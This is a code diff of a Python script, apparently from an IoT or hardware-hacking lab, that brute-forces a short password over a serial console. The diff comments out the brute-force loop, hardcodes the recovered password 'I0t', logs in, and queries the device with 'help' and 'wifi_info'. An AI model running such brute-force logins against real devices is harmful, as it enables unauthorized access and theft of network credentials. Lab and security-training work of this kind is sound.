@@ -32,22 +32,23 @@ nums = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
 upper_letters = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
 lower_letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
 break_out_flag = False
-for first_char in upper_letters:
-    for second_char in nums:
-        for third_char in lower_letters:
-            if(break_out_flag): 
-                break
-            else:
-                passwd = first_char + second_char + third_char + '\r'
-                message = query(serial_conn, passwd)
-                print(passwd)
-                print(message)
-                if "[error]" in message:
-                    pass
-                else:
-                    break_out_flag = True
-    
+# for first_char in upper_letters:
+#     for second_char in nums:
+#         for third_char in lower_letters:
+#             if(break_out_flag): 
+#                 break
+#             else:
+#                 passwd = first_char + second_char + third_char + '\r'
+#                 message = query(serial_conn, passwd)
+#                 print(passwd)
+#                 print(message)
+#                 if "[error]" in message:
+#                     pass
+#                 else:
+#                     break_out_flag = True
 
+#With above loop, password was found to be "I0t"
+passwd = "I0t"
 
 # for first_char in nums:
 #     for second_char in nums:
@@ -57,6 +58,9 @@ for first_char in upper_letters:
 #             query(serial_conn, passwd)
 
 
-# query(serial_conn, '123\r')
-# query(serial_conn, 'help\r')
+print(query(serial_conn, passwd + '\r'))
 
+print(query(serial_conn, 'help\r'))
+print(read_block(serial_conn,50))
+print(query(serial_conn, 'wifi_info\r'))
+print(read_block(serial_conn,50))
